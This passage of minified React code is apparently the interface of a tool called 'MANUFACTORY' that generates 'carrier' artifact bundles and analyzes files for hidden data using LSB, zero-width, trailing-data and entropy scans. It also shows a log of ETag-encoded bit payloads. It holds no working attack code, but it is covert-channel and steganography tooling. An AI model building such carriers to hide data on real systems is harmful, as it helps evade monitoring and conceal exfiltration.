0:d.bits)??3)*6)},children:[p.jsxs("div",{className:"h",children:[p.jsx("b",{children:r.id}),p.jsx("span",{className:"chip",children:r.reg}),p.jsx("span",{children:r.at.slice(11,19)}),p.jsx("span",{style:{marginLeft:"auto"},children:r.src})]}),p.jsxs("div",{style:{color:"#aeb9b4"},children:[r.payload&&r.payload.etag?`ETag ${r.payload.etag} · ${r.payload.bits} b`:JSON.stringify(r.payload??{})," · ",(f=r.ua)==null?void 0:f.slice(0,40)]}),p.jsxs("div",{className:"chain",children:["prev ",r.prev.slice(0,12),"… → sha256 ",r.hash.slice(0,24),"…"]})]},o)})]})]})}function or({title:l,onClose:c,children:r,foot:o}){return p.jsx("div",{className:"dim",onMouseDown:d=>{d.target===d.currentTarget&&c()},children:p.jsxs("div",{className:"modal",children:[p.jsxs("div",{className:"m-head",children:[l,p.jsx("button",{className:"x",onClick:c,children:"×"})]}),p.jsx("div",{className:"m-body",children:r}),p.jsx("div",{className:"m-foot",children:o})]})})}function n2({arts:l,onPick:c,onAction:r}){const[o,d]=ge.useState(""),[f,g]=ge.useState(0),y=[{k:"generate",d:"open generate modal",run:()=>r("generate")},{k:"analyze",d:"open analyze modal",run:()=>r("analyze")},{k:"evidence",d:"open evidence panel",run:()=>r("evidence")},{k:"help",d:"keymap",run:()=>r("help")}],_=ge.useMemo(()=>{const v=o.toLowerCase(),b=l.filter(T=>!v||`${T.reg} ${T.name} ${T.sub} ${T.cat}`.toLowerCase().includes(v)).slice(0,12).map(T=>({kind:"artifact",label:`${T.reg}  ${T.name}`,hint:T.cat,run:()=>{c(T.reg),r(null)}})),w=y.filter(T=>!v||T.k.includes(v)).map(T=>({kind:"action",label:T.k,hint:T.d,run:T.run}));return[...b,...w]},[l,o]),m=_[f];return p.jsx("div",{className:"dim",onMouseDown:v=>{v.target===v.currentTarget&&r(null)},children:p.jsxs("div",{className:"palette",children:[p.jsx("input",{autoFocus:!0,placeholder:"type a reg, an artifact, or an action…  (esc closes)",value:o,onChange:v=>{d(v.target.value),g(0)},onKeyDown:v=>{v.key==="ArrowDown"&&(v.preventDefault(),g(b=>Math.min(_.length-1,b+1))),v.key==="ArrowUp"&&(v.preventDefault(),g(b=>Math.max(0,b-1))),v.key==="Enter"&&m&&m.run()}}),p.jsxs("div",{className:"plist",children:[_.map((v,b)=>p.jsxs("div",{className:`pitem ${b===f?"on":""}`,onMouseEnter:()=>g(b),onClick:()=>v.run(),children:[p.jsx("span",{className:"kind",children:v.kind}),v.label,p.jsx("span",{className:"hint",children:v.hint})]},b)),_.length===0&&p.jsx("div",{className:"pitem",children:"no match"})]})]})})}function l2({onClose:l}){const c=[["j / k","prev / next artifact (catalog)"],["⏎ / click","open artifact (preview warms to it)"],["V","cycle view: RENDERED · SOURCE · HEX · STRUCTURE · ENTROPY"],["⌘K / ctrl+K","palette — artifacts + actions"],["G","generate modal"],["A","analyze modal (drop a file)"],["E","evidence panel"],["?","this overlay"],["ESC","close modal / evidence"]];return p.jsx(or,{title:"MANUFACTORY — KEYMAP",onClose:l,foot:p.jsx("button",{className:"mbtn",onClick:l,children:"CLOSE"}),children:p.jsx("div",{className:"kmap",children:p.jsx("table",{children:c.map(([r,o])=>p.jsxs("tr",{children:[p.jsx("td",{style:{width:130},children:p.jsx("kbd",{children:r})}),p.jsx("td",{children:o})]},r))})})})}function i2({art:l,bundle:c,onDone:r,onClose:o}){const[d,f]=ge.useState("ghost"),[g,y]=ge.useState(!1),_=async()=>{y(!0);const m=og(c.files.map(w=>({path:w.path,data:w.data})));let v="";try{const T=await(await fetch(`/api/generate/${l.reg}`,{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({runAs:d})})).json();v=T.bundle&&T.zipSize===m.length&&T.bundle.files.length===c.files.length?` · trinity check OK (api ⇄ web, ${T.zipSize} B zip)`:" · trinity check FAILED — investigate"}catch{v=" · (api offline — local only)"}$s(`${l.reg.toLowerCase()}-${d}.zip`,m,"application/zip");const b=(m.length/1024).toFixed(1);r(`${l.reg} generated — ${c.files.length} files · ${b} KB zip${v}`),y(!1)};return p.jsxs(or,{title:`GENERATE — ${l.reg} · ${l.name}`,onClose:o,foot:p.jsxs(p.Fragment,{children:[p.jsx("button",{className:"mbtn",onClick:o,children:"CANCEL"}),p.jsx("button",{className:"mbtn red",onClick:_,disabled:g,children:g?"GENERATING…":"GENERATE"})]}),children:[p.jsxs("div",{children:["manifest — ",c.files.length," files (5-file rule: server · carrier · dashboard · deploy · card)"]}),p.jsx("table",{className:"manifest",children:c.files.map(m=>p.jsxs("tr",{children:[p.jsxs("td",{children:[p.jsx("span",{className:"ok",children:"[x]"}),"  ",m.path]}),p.jsxs("td",{className:"sz",children:[m.data.length," b"]}),p.jsx("td",{className:"sz",children:m.lang})]},m.path))}),p.jsx("div",{children:"run as"}),p.jsx("div",{className:"radios",children:["ghost","static","docker"].map(m=>p.jsxs("label",{children:[p.jsx("input",{type:"radio",checked:d===m,onChange:()=>f(m)})," ",m.toUpperCase()]},m))}),p.jsx("div",{className:"shellprev",children:(c.shell[d]??[]).join(`
`)})]})}const r2=["magic signature","ico alpha-LSB sync scan","png red-LSB sync scan","zero-width scan","trailing data","entropy"];function s2({onJump:l,onToast:c,onClose:r}){const[o,d]=ge.useState(!1),[f,g]=ge.useState(null),[y,_]=ge.useState(""),m=ge.useRef(null),v=f?BS(f):null,b=async w=>{const T=new Uint8Array(await w.arrayBuffer());if(T.length>8*1024*1024){_("file too large (8 MB cap)");return}g(HS(T,w.name)),_("")};return p.jsxs(or,{title:"ANALYZE — DROP A FILE INTO THE SOCKET",onClose:r,foot:p.jsxs(p.Fragment,{children:[p.jsx("button",{className:"mbtn",onClick:r,children:"CANCEL"}),v&&p.jsxs("button",{className:"mbtn red",onClick:()=>l(v),children:["JUMP TO ARTIFACT → ",v]}),f&&!v&&p.jsx("button",{className:"mbtn",onClick:()=>{$s(`report-${f.file}.json`,JSON.stringify(f,null,2),"application/json"),c("report exported")},children:"EXPORT REPORT"})]}),children:[p.jsx("div",{className:`socket ${o?"hot":""}`,onClick:()=>{var w;return(w=m.current)==null?void 0:w.click()},onDragOver:w=>{w.preventDefault(),d(!0)},onDragLeave:()=>d(!1),onDrop:w=>{w.preventDefault(),d(!1);const T=w.dataTransfer.files[0];T&&b(T)},children:p.jsx("span",{className:"lab",children:"USB SOCKET — ico · png · txt · any"})}),p.jsx("input",{ref:m,type:"file",style:{display:"none"},onChange:w=>{var U;const T=(U=w.target.files)==null?void 0:U[0];T&&b(T)}}),y&&p.jsx("div",{style:{color:"var(--signal)",fontWeight:700,marginTop:12},children:y}),!f&&p.jsxs("ul",{className:"detlist",children:[r2.map(w=>p.jsxs("li",{children:[p.jsx("span",{className:"b"}),w,p.jsx("span",{className:"note",children:"armed"})]},w)),p.jsxs("li",{children:[p.jsx("span",{className:"b"}),"zip-walk · woff2 · svg · exif · id3 · pdf",p.jsx("span",{className:"note",children:"na — phase 3"})]})]}),f&&p.jsx(c2,{report:f})]})}function c2({report:l}){const c=l.lsb;let r=null;if(c){const d=atob(c.bits);r=Array.from({length:c.w*c.h},(f,g)=>d.charCodeAt(g>>3)>>7-(g&7)&1)}const o=c&&c.w<=96?Math.ceil(230/c.w):4;return p.jsxs("div",{children:[p.jsx("div",{className:`verdict ${l.verdict==="clean"?"clean":"flag"}`,children:l.verdict}),p.jsxs("div",{children:["confidence ",p.jsx("span",{className:"dots",children:"●●●●●".split("").map((d,f)=>p.jsx("span",{className:f<l.confidence?"on":"off",children:"●"},f))})," · ",l.magic," · ",l.file," · ",l.size," b"]}),p.jsx("ul",{className:"detlist",style:{marginTop:10},children:l.detectors.map(d=>p.jsxs("li",{className:d.status==="flag"?"flag":d.status==="clean"?"run":"",children:[p.jsx("span",{className:"b"}),d.name,p.jsx("span",{className:"note",children:d.note})]},d.id))}),l.extracted&&p.jsxs("div",{style:{marginTop:10,background:"#101517",color:"#7fd6a0",borderRadius:4,padding:"10px 12px",fontSize:11},children:["extracted: “",l.extracted,"”"]}),c&&r&&p.jsxs("div",{style:{marginTop:12},children:[p.jsxs("div",{style:{fontSize:8.5,letterSpacing:1,color:"#78868a",marginBottom:6},children:[c.plane.toUpperCase()," LSB HEATMAP · ",c.w,"×",c.h]}),p.jsx("div",{className:"heat",style:{gridTemplateColumns:`repeat(${c.w}, ${o}px)`},children:Array.from({length:c.w*c.h},(d,f)=>p.jsx("i",{className:r[f]?"bit1":"",style:{width:o,height:o}},f))})]})]})}function o2({art:l,bundle:c,onClose:r}){return p.jsxs(or,{title:`EXPORT — ${l.reg}`,onClose:r,foot:p.jsxs(p.Fragment,{children:[p.jsx("button",{className:"mbtn",onClick:r,children:"CLOSE"}),p.jsx("button",{className:"mbtn",onClick:()=>$s(`${l.reg}-manifest.json`,JSON.stringify({meta:c.meta,bundle:c.bundle,spec:c.spec},null,2),"application/json"),children:"MANIFEST .JSON"}),p.jsx("button",{className:"mbtn red",onClick:()=>$s(`${l.reg.toLowerCase()}.zip`,og(c.files.map(o=>({path:o.path,data:o.data}))),"application/zip"),children:"BUNDLE .ZIP"})]}),children:[c.files.length," files · ",c.files.reduce((o,d)=>o+d.data.length,0)," b total · run-as: ghost / static / docker"]})}function u2({onConfirm:l,onClose:c}){return p.jsx(or,{title:"DISCARD — confirm",onClose:c,foot:p.jsxs(p.Fragment,{children:[p.jsx("button",{className:"mbtn",onClick:c,children:"KEEP"}),p.jsx("button",{className:"mbtn red",onClick:l,children:"DISCARD"})]}),children:"throws away uncommitted editor changes for this artifact. the generated bytes themselves are deterministic and never touched."})}const cf=["rendered","source","hex","structure","entropy"];function f2(){var K,te;const[l,c]=ge.useState([]),[r,o]=ge.useState("BSC-001"),[d,f]=ge.useState(null),[g,y]=ge.useState("rendered"),[_,m]=ge.useState({}),[v,b]=ge.useState(55),[w,T]=ge.useState(!1),[U,G]=ge.useState(null),[q,V]=ge.useState([]),ee=le=>{G(null),le==="evidence"?T(!0):le&&G(le)},W=(le,be="ok")=>{const Xe=Date.now()+Math.random();V(_e=>[..._e,{id:Xe,msg:le,kind:be}]),setTimeout(()=>V(_e=>_e.filter(k=>k.id!==Xe)),4200)};ge.useEffect(()=>{kS().then(le=>c(le.artifacts)).catch(()=>c(nc))},[]);const M=ge.useMemo(()=>l.find(le=>le.reg===r)??null,[l,r]),Q=ge.useMemo(()=>{if(!r)return null;try{return MS(r)}catch{return null}},[r]),he=le=>{o(le),f(null),m({})},B=le=>{he(le),G(null),W(`jumped to ${le}`)};ge.useEffect(()=>{const le=be=>{var _e,k;if(be.key==="Escape"){G(null),T(!1);return}const Xe=((_e=be.target)==null?void 0:_e.tagName)==="INPUT"||((k=be.target)==null?void 0:k.tagName)==="TEXTAREA";if((be.metaKey||be.ctrlKey)&&be.key.toLowerCase()==="k"){be.preventDefault(),G("palette");return}if(!Xe){if(be.key==="?"){G("help");return}if(be.key==="v"){y(F=>cf[(cf.indexOf(F)+1)%cf.length]);return}if(be.key==="e"){T(F=>!F);return}if(be.key==="g"){G("generate");return}if(be.key==="a"){G("analyze");return}if(be.key==="j"||be.key==="k"){const F=l.findIndex(Ce=>Ce.reg===r),ae=be.key==="j"?F+1:F-1;l[ae]&&(o(l[ae].reg),f(null),m({}))}}};return window.addEventListener("keydown",le),()=>window.removeEventListener("keydown",le)},[l,r]);const X=le=>{le.preventDefault();const be=_e=>{const k=le.currentTarget.parentElement.getBoundingClientRect(),F=(_e.clientY-k.top)/k.height*100;b(Math.min(75,Math.max(30,F)))},Xe=()=>{window.removeEventListener("mousemove",be),window.removeEventListener("mouseup",Xe)};window.addEventListener("mousemove",be),window.addEventListener("mouseup",Xe)};Q==null||Q.files;const ie=d??((K=Q==null?void 0:Q.files.find(le=>le.lang!=="json"))==null?void 0:K.path)??((te=Q==null?void 0:Q.files[0])==null?void 0:te.path)??null;return p.jsxs("div",{className:"bench",children:[p.jsx(qS,{art:M,showEv:w,dirty:Object.keys(_).length>0,onEvidence:()=>T(!0)}),p.jsxs("div",{className:"main",children:[p.jsx(JS,{arts:l,sel:r,onPick:he}),p.jsxs("div",{className:"center",children:[p.jsx("div",{className:"panel pv",style:{flex:v},children:p.jsx(PS,{art:M,bundle:Q,mode:g,file:d,setFile:f,onToast:W})}),p.jsx("div",{className:"splitline",onMouseDown:X}),p.jsx("div",{className:"panel tr",style:{flex:100-v},children:p.jsx(e2,{bundle:Q,file:d,setFile:f,dirty:_})})]}),w?p.jsx(a2,{}):p.jsxs("div",{className:"right",children:[p.jsx(t2,{bundle:Q,file:d,dirty:_,setDirty:m,setFile:f,onToast:W}),p.jsxs("div",{className:"actions",children:[p.jsxs("button",{className:"act gen",disabled:!M||M.status!=="live",onClick:()=>G("generate"),children:[p.jsx("b",{children:"⚑"}),"GENERATE",p.jsx("span",{children:(M==null?void 0:M.status)==="live"?" · G":" · stub"})]}),p.jsxs("button",{className:"act anl",onClick:()=>G("analyze"),children:[p.jsx("b",{children:"⌁"}),"ANALYZE",p.jsx("span",{children:" · A"})]}),p.jsxs("button",{className:"act",disabled:!M,onClick:()=>G("export"),children:[p.jsx("b",{children:"⇩"}),"EXPORT",p.jsx("span",{children:" · X"})]}),p.jsxs("button",{className:"act",disabled:!Object.keys(_).length&&!M,onClick:()=>G("discard"),children:[p.jsx("b",{children:"✕"}),"DISCARD",p.jsx("span",{children:" · D"})]})]})]})]}),p.jsx(YS,{art:M,mode:g,file:ie,dirty:Object.keys(_).length,n:l.length,live:l.filter(le=>le.status==="live").length,onHelp:()=>G("help")}),p.jsx(ZS,{}),p.jsx(XS,{toasts:q}),U==="palette"&&p.jsx(n2,{arts:l,onPick:he,onAction:ee}),U==="help"&&p.jsx(l2,{onClose:()=>G(null)}),U==="generate"&&M&&Q&&p.jsx(i2,{art:M,bundle:Q,onDone:le=>{W(le),G(null)},onClose:()=>G(null)}),U==="analyze"&&p.jsx(s2,{onJump:B,onToast:W,onClose:()=>G(null)}),U==="export"&&M&&Q&&p.jsx(o2,{art:M,bundle:Q,onClose:()=>G(null)}),U==="discard"&&p.jsx(u2,{onConfirm:()=>{m({}),G(null),W("discarded — editor reset")},onClose:()=>G(null)})]})}r1.createRoot(document.getElementById("root")).render(p.jsx(Wb.StrictMode,{children:p.jsx(f2,{})}));
